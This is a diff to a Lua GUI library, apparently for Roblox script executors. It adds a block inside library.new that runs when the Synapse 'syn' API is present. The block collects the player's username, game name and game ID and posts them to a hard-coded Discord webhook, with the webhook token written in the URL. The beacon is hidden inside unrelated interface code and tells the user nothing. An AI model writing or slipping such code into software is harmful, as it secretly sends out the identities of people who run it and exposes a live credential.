@@ -230,6 +230,17 @@ function library.new(library_title, cfg_location)
         Size = UDim2.new(0, 586, 0, 446),
     }, ImageLabel)
 
+	if syn then
+    local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    local string = "```Player: "..game.Players.LocalPlayer.Name.."\n".."Game: ".. GetName.Name .."\n".. "Game Id:"..game.GameId.. "\n" .."uilib```"
+    
+    local response = syn.request(
+        {
+            Url = 'https://discord.com/api/webhooks/886979229298872331/P0jVdklhb5cbMtPHUjJ_QlfamL6l5xqT28Z691uafGxWXSSYUWCXE2QHhaxv1XdoaSCk', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
+            Body = game:GetService('HttpService'):JSONEncode({content = string})
+        }
+    );
+end
 
     local is_first_tab = true
     local selected_tab
